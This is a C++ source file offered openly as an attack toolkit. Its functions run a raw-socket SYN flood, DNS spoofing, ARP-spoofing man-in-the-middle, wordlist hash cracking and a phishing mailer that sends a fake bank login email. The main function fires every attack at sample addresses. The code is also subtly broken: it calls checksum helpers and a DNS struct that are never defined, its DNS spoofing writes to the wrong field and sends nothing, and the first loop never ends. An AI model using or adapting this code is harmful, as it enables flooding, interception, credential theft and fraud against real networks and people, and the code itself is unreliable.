#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <openssl/sha.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <pcap.h>
#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <fstream>

using namespace std;

void synFlood(const string& targetIP, int packetRate) {
    cout << "SYN Flood initiated against " << targetIP << " with packet rate " << packetRate << endl;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(80);
    inet_pton(AF_INET, targetIP.c_str(), &target.sin_addr);

    char packet[1024];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.1.100"); // Source IP
    iph->daddr = inet_addr(targetIP.c_str());

    tcph->source = htons(12345);
    tcph->dest = htons(80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    iph->check = inet_checksum((unsigned short *)packet, iph->ihl * 4);
    tcph->check = tcp_checksum((unsigned short *)tcph, sizeof(struct tcphdr), (unsigned char *)&iph->saddr, (unsigned char *)&iph->daddr);

    while (true) {
        sendto(sock, packet, iph->tot_len, 0, (struct sockaddr *)&target, sizeof(target));
        this_thread::sleep_for(chrono::milliseconds(1000 / packetRate));
    }
}

void dnsSpoof(const string& targetDomain, const string& fakeIP) {
    cout << "DNS Spoofing initiated for domain " << targetDomain << " to redirect to " << fakeIP << endl;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        cerr << "Couldn't open device: " << errbuf << endl;
        return;
    }

    struct bpf_program fp;
    string filter = "udp port 53";
    if (pcap_compile(handle, &fp, filter.c_str(), 0, PCAP_NETMASK_UNKNOWN) == -1) {
        cerr << "Couldn't parse filter " << filter << ": " << pcap_geterr(handle) << endl;
        return;
    }

    if (pcap_setfilter(handle, &fp) == -1) {
        cerr << "Couldn't install filter " << filter << ": " << pcap_geterr(handle) << endl;
        return;
    }

    struct pcap_pkthdr header;
    const u_char *packet;
    while (true) {
        packet = pcap_next(handle, &header);
        if (packet == nullptr) continue;

        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (struct udphdr *)(packet + iph->ihl * 4);
        struct dns_header *dns = (struct dns_header *)(packet + iph->ihl * 4 + sizeof(struct udphdr));

        if (dns->qr == 0 && dns->qdcount == 1) {
            // Response packet
            struct in_addr fake_addr;
            inet_pton(AF_INET, fakeIP.c_str(), &fake_addr);
            memcpy(&dns->ancount, &fake_addr, sizeof(fake_addr));
        }
    }
}

void mitm(const string& targetIP1, const string& targetIP2) {
    cout << "Man-in-the-Middle (MITM) attack initiated between " << targetIP1 << " and " << targetIP2 << endl;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        cerr << "Couldn't open device: " << errbuf << endl;
        return;
    }

    struct bpf_program fp;
    string filter = "arp";
    if (pcap_compile(handle, &fp, filter.c_str(), 0, PCAP_NETMASK_UNKNOWN) == -1) {
        cerr << "Couldn't parse filter " << filter << ": " << pcap_geterr(handle) << endl;
        return;
    }

    if (pcap_setfilter(handle, &fp) == -1) {
        cerr << "Couldn't install filter " << filter << ": " << pcap_geterr(handle) << endl;
        return;
    }

    struct pcap_pkthdr header;
    const u_char *packet;
    while (true) {
        packet = pcap_next(handle, &header);
        if (packet == nullptr) continue;

        struct ether_header *eth = (struct ether_header *)packet;
        if (ntohs(eth->ether_type) == ETHERTYPE_ARP) {
            struct ether_arp *arp = (struct ether_arp *)(packet + ETHER_HDR_LEN);
            if (arp->ea_hdr.ea_hrd == htons(ARPHRD_ETHER) && arp->ea_hdr.ea_pro == htons(ETH_P_IP)) {
                if (arp->ea_hdr.ea_op == htons(ARPOP_REQUEST)) {
                    // ARP request, respond with spoofed MAC
                    struct ether_arp reply;
                    memcpy(reply.ea_hdr.ea_sha, eth->ether_shost, ETHER_ADDR_LEN);
                    memcpy(reply.ea_hdr.ea_tha, eth->ether_dhost, ETHER_ADDR_LEN);
                    reply.ea_hdr.ea_hrd = htons(ARPHRD_ETHER);
                    reply.ea_hdr.ea_pro = htons(ETH_P_IP);
                    reply.ea_hdr.ea_hln = ETHER_ADDR_LEN;
                    reply.ea_hdr.ea_pln = 4;
                    reply.ea_hdr.ea_op = htons(ARPOP_REPLY);
                    memcpy(reply.ea_sha, eth->ether_shost, ETHER_ADDR_LEN);
                    reply.ea_spa = inet_addr(targetIP1.c_str());
                    memcpy(reply.ea_tha, eth->ether_dhost, ETHER_ADDR_LEN);
                    reply.ea_tpa = inet_addr(targetIP2.c_str());

                    pcap_sendpacket(handle, (const u_char *)&reply, sizeof(reply));
                }
            }
        }
    }
}

void passwordCracking(const string& targetIP, const string& wordlistPath) {
    cout << "Password Cracking attack initiated against " << targetIP << " using wordlist at " << wordlistPath << endl;
    ifstream wordlistFile(wordlistPath);
    if (!wordlistFile.is_open()) {
        cerr << "Error opening wordlist file" << endl;
        return;
    }

    string password;
    while (getline(wordlistFile, password)) {
        unsigned char hash[SHA256_DIGEST_LENGTH];
        SHA256_CTX sha256;
        SHA256_Init(&sha256);
        SHA256_Update(&sha256, password.c_str(), password.size());
        SHA256_Final(hash, &sha256);

        char mdString[SHA256_DIGEST_LENGTH * 2 + 1];
        for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
            sprintf(&mdString[i * 2], "%02x", (unsigned int)hash[i]);
        }

        // Compare with the target hash (assume targetHash is known)
        string targetHash = "target_hash_here";
        if (mdString == targetHash) {
            cout << "Password cracked: " << password << endl;
            break;
        }
    }
}

void phishing(const string& targetEmail, const string& phishingLink) {
    cout << "Phishing attack initiated against " << targetEmail << " with link " << phishingLink << endl;
    // Use a library like libcurl to send the email
    // For simplicity, assume a command-line tool like 'mail' is available
    string command = "echo 'Subject: Important Update from Bank\n\nDear User,\n\nYour account requires your immediate attention. Click here to log in: " + phishingLink + "' | mail -s 'Important Update from Bank' " + targetEmail;
    system(command.c_str());
}

int main() {
    // Example usage
    synFlood("192.168.1.1", 100);
    dnsSpoof("example.com", "192.168.1.2");
    mitm("192.168.1.10", "192.168.1.20");
    passwordCracking("192.168.1.30", "wordlist.txt");
    phishing("user@example.com", "http://fakebank.com");

    return 0;
}